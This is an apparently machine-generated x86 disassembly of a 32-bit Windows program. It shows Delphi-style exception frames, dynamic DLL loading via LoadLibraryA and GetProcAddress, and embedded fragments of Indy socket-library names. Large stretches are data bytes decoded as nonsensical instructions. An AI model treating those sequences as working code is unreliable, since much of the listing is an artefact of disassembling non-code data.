add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1b
inc esi
add [ eax ] al
add ah ah
sbb eax [ esi ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x53644945 ] bl
mov eax 0x461f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00461f ] bh
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
and al [ esi ]
or al 0x0
add [ eax ] al
in al 0x1b
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0046 ] dh
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
push esp
dec esp
inc ebp
js r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add al cl
xor eax [ eax ]
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] dl
inc ebp
dec ecx
dec ecx
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
adc al 0x23
inc esi
add [ eax ] al
add [ eax ] al
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and eax [ esi ]
adc [ eax ] al
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax + 0x23 ] dh
inc esi
add [ esi ] cl
inc ebp
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
mov ah 0x22
inc esi
add [ eax ] al
add [ eax ] al
sub_462328
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b9cc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_462370
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b9cc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4623b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4623dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623e4
retn
sub_4623f0
xchg esi eax
dec eax
add ah ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax + 0x640000fe ] dh
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ edx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] dh
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] dh
dec eax
add [ ebp + 0x640000fe ] dh
xchg esi eax
dec eax
add [ esi + 0x640000fe ] dh
xchg esi eax
dec eax
add [ edi + 0x640000fe ] dh
xchg esi eax
dec eax
add [ eax + 0x640000fe ] bh
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ edx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] bh
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] bh
dec eax
add [ ebp + 0x640000fe ] bh
xchg esi eax
dec eax
add [ esi + 0x640000fe ] bh
xchg esi eax
dec eax
add [ edi + 0x640000fe ] bh
xchg esi eax
dec eax
add [ eax + 0x640000fe ] ah
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ edx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] ah
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] ah
dec eax
add [ ebp + 0x640000fe ] ah
xchg esi eax
dec eax
add [ esi + 0x640000fe ] ah
xchg esi eax
dec eax
add [ edi + 0x640000fe ] ah
xchg esi eax
dec eax
add [ eax + 0x640000fe ] ch
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] ch
xchg esi eax
dec eax
add [ edx + 0x640000fe ] ch
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] ch
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] ch
dec eax
add [ ebp + 0x640000fe ] ch
xchg esi eax
dec eax
add [ esi + 0x640000fe ] ch
xchg esi eax
dec eax
add [ edi + 0x640000fe ] ch
xchg esi eax
dec eax
add [ eax + 0x640000fe ] dl
xchg esi eax
dec eax
add [ ecx + 0x640000fe ] dl
xchg esi eax
dec eax
add [ edx + 0x640000fe ] dl
xchg esi eax
dec eax
add [ ebx + 0x640000fe ] dl
xchg esi eax
dec eax
add [ esi + edi * 8 - 0x699c0000 ] dl
dec eax
add [ ebp + 0x640000fe ] dl
xchg esi eax
dec eax
add [ esi + 0x640000fe ] dl
xchg esi eax
dec eax
add [ edi + 0x640000fe ] dl
xchg esi eax
dec eax
add [ eax + 0x640000fe ] bl
xchg esi eax
dec eax
add [ ecx + 0x550000fe ] bl
mov ebp esp
xor eax eax
push ebp
push sub_4626c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4626cc
retn
sub_462750
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4627f0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403f94
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403490
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b1c4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403f94
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4042c0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b9cc
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b9cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4627f7
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
sub_4627f7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4635d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_463677
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46367e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409118
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462750
call sub_4038f8
sub_463688
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_4636ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_463779
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_409118
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462750
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463780
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_4637b7
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4637e4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637eb
retn
call sub_462828
sub_463800
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463825
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46382c
retn
sub_463838
test [ eax ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x40046 ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax + 0x6c004641 ] dl
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
fdivr [ ebx ]
inc esi
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ eax + 0x6c00463c ] al
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
imul esi [ ebx + 0x74 ] 0x38f0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x10004639 ] al
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
cmp al [ esi ]
or al 0x0
add [ eax ] al
nop
cmp [ esi ] eax
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
arpl [ ebx - 0x70 ] bp
fdivr [ ecx ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmp [ esi ] eax
or al 0x0
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x53644945 ] cl
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xa400408d
cmp al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
cmp al [ esi ]
or al 0x0
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] al
nop
cmp [ esi ] eax
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi + 0xc0046 ] ah
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_463ac8
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
sar [ eax ] 0x3a
sub_463ac8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_463b7c
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_463b10
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_463b6f
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b76
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_463b7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463bce
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_462370
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463bd5
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_463c08
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_4080e8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4640b4
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_403f94
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_403f94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_463c80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_46407a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f40
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409118
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464081
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
jmp [ eax * 4 + jump_table_463cc0 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
sub_464088
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_408500
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_408500
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_4640b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_464173
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fd8
mov eax [ ebp - 0x8 ]
call sub_464088
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_464088
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46417a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f64
retn
mov eax [ ebp - 0x10 ]
call sub_464088
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_464088
test al al
jne r-xdata
mov bl 0x1
sub_464190
push ebx
push esi
call sub_4034f8
mov ebx edx
